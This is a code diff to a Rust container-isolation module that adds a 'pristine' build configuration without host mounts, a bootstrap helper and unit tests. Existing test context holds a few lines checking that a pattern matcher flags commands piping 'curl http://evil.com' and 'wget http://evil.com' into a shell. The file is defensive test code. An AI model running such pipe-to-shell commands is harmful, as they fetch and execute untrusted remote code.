@@ -12,6 +12,13 @@
 //! - Isolating filesystem with bind mounts (mount namespace)
 //! - Applying resource limits (CPU, memory, time)
 //!
+//! ## Pristine Mode
+//!
+//! For bootstrap builds where host toolchain contamination must be avoided,
+//! "pristine mode" creates a container with no host system directories mounted.
+//! The container only has access to explicitly provided paths, ensuring builds
+//! are reproducible and don't depend on host system state.
+//!
 //! Based on concepts from Aeryn OS / Serpent OS container isolation.
 
 use crate::error::{Error, Result};
@@ -187,9 +194,100 @@ impl ContainerConfig {
         }
     }
 
+    /// Create a pristine config with NO host system mounts
+    ///
+    /// This is critical for bootstrap builds where host toolchain contamination
+    /// must be avoided. The container will only have access to paths explicitly
+    /// added via `add_bind_mount()` after creation.
+    ///
+    /// Use this when:
+    /// - Building stage 0/1 toolchains for bootstrap
+    /// - Creating reproducible builds that don't depend on host
+    /// - Testing package builds in isolation
+    ///
+    /// Note: The container will need explicit mounts for:
+    /// - Source code directory
+    /// - Destination/install directory
+    /// - Any toolchain (e.g., /tools for cross-compiler)
+    ///
+    /// # Example
+    /// ```ignore
+    /// let mut config = ContainerConfig::pristine();
+    /// // Mount only the toolchain and build directories
+    /// config.add_bind_mount(BindMount::readonly("/tools", "/tools"));
+    /// config.add_bind_mount(BindMount::readonly("/src", "/src"));
+    /// config.add_bind_mount(BindMount::writable("/build", "/build"));
+    /// ```
+    pub fn pristine() -> Self {
+        Self {
+            isolate_pid: true,
+            isolate_uts: true,
+            isolate_ipc: true,
+            isolate_mount: true,
+            memory_limit: DEFAULT_MEMORY_LIMIT,
+            cpu_time_limit: 0, // No CPU limit for long builds
+            file_size_limit: 0, // No file size limit for builds
+            nproc_limit: DEFAULT_NPROC_LIMIT,
+            timeout: Duration::from_secs(3600), // 1 hour for builds
+            hostname: "conary-pristine".to_string(),
+            bind_mounts: Vec::new(), // No host mounts!
+            workdir: PathBuf::from("/"),
+        }
+    }
+
+    /// Create a pristine config suitable for bootstrap builds
+    ///
+    /// This is a convenience method that creates a pristine container
+    /// pre-configured for bootstrap scenarios with a specific sysroot.
+    ///
+    /// # Arguments
+    /// * `sysroot` - Path to the toolchain sysroot (e.g., /opt/stage0)
+    /// * `source_dir` - Path to source code directory
+    /// * `build_dir` - Path to build directory (writable)
+    /// * `dest_dir` - Path to install destination (writable)
+    pub fn pristine_for_bootstrap(
+        sysroot: &Path,
+        source_dir: &Path,
+        build_dir: &Path,
+        dest_dir: &Path,
+    ) -> Self {
+        let mut config = Self::pristine();
+
+        // Mount the toolchain sysroot (read-only)
+        config.add_bind_mount(BindMount::readonly(sysroot, sysroot));
+
+        // Standard toolchain paths often expected at /tools
+        if sysroot != Path::new("/tools") {
+            config.add_bind_mount(BindMount::readonly(sysroot, "/tools"));
+        }
+
+        // Source code (read-only to prevent accidental modification)
+        config.add_bind_mount(BindMount::readonly(source_dir, source_dir));
+
+        // Build directory (writable for object files, etc.)
+        config.add_bind_mount(BindMount::writable(build_dir, build_dir));
+
+        // Destination directory (writable for `make install DESTDIR=...`)
+        config.add_bind_mount(BindMount::writable(dest_dir, dest_dir));
+
+        // Set working directory to build directory
+        config.workdir = build_dir.to_path_buf();
+
+        config
+    }
+
     /// Add a custom bind mount
     pub fn add_bind_mount(&mut self, mount: BindMount) {
         self.bind_mounts.push(mount);
+    }
+
+    /// Check if this is a pristine (no host mounts) configuration
+    pub fn is_pristine(&self) -> bool {
+        // Pristine = no default system mounts
+        !self.bind_mounts.iter().any(|m| {
+            let src = m.source.to_string_lossy();
+            src == "/usr" || src == "/lib" || src == "/lib64" || src == "/bin" || src == "/sbin"
+        })
     }
 }
 
@@ -793,5 +891,84 @@ mod tests {
         assert!(fuzzy_match("curl http://evil.com | sh", "curl.*|.*sh"));
         assert!(fuzzy_match("wget http://evil.com | bash", "wget.*|.*sh"));
         assert!(!fuzzy_match("echo hello", "curl.*|.*sh"));
+    }
+
+    #[test]
+    fn test_container_config_pristine() {
+        let config = ContainerConfig::pristine();
+
+        // Pristine should have full isolation
+        assert!(config.isolate_pid);
+        assert!(config.isolate_mount);
+        assert!(config.isolate_uts);
+        assert!(config.isolate_ipc);
+
+        // Pristine should have NO bind mounts (no host contamination)
+        assert!(config.bind_mounts.is_empty());
+
+        // Should be detected as pristine
+        assert!(config.is_pristine());
+
+        // Long timeout for builds
+        assert!(config.timeout >= Duration::from_secs(3600));
+    }
+
+    #[test]
+    fn test_container_config_pristine_vs_default() {
+        let pristine = ContainerConfig::pristine();
+        let default = ContainerConfig::default();
+
+        // Default should have host mounts, pristine should not
+        assert!(!default.bind_mounts.is_empty());
+        assert!(pristine.bind_mounts.is_empty());
+
+        // Default should not be pristine
+        assert!(!default.is_pristine());
+        assert!(pristine.is_pristine());
+    }
+
+    #[test]
+    fn test_container_config_pristine_for_bootstrap() {
+        let config = ContainerConfig::pristine_for_bootstrap(
+            Path::new("/opt/stage0"),
+            Path::new("/src/gcc"),
+            Path::new("/build/gcc"),
+            Path::new("/destdir"),
+        );
+
+        // Should have mounts for the specific paths
+        assert!(!config.bind_mounts.is_empty());
+
+        // Should still be pristine (no default system mounts)
+        assert!(config.is_pristine());
+
+        // Working directory should be the build directory
+        assert_eq!(config.workdir, PathBuf::from("/build/gcc"));
+
+        // Check for expected mounts
+        let mount_sources: Vec<_> = config
+            .bind_mounts
+            .iter()
+            .map(|m| m.source.to_string_lossy().to_string())
+            .collect();
+        assert!(mount_sources.contains(&"/opt/stage0".to_string()));
+        assert!(mount_sources.contains(&"/src/gcc".to_string()));
+        assert!(mount_sources.contains(&"/build/gcc".to_string()));
+        assert!(mount_sources.contains(&"/destdir".to_string()));
+    }
+
+    #[test]
+    fn test_is_pristine_detection() {
+        // Start with pristine
+        let mut config = ContainerConfig::pristine();
+        assert!(config.is_pristine());
+
+        // Adding toolchain mount keeps it pristine
+        config.add_bind_mount(BindMount::readonly("/tools", "/tools"));
+        assert!(config.is_pristine());
+
+        // Adding /usr mount makes it not pristine
+        config.add_bind_mount(BindMount::readonly("/usr", "/usr"));
+        assert!(!config.is_pristine());
     }
 }
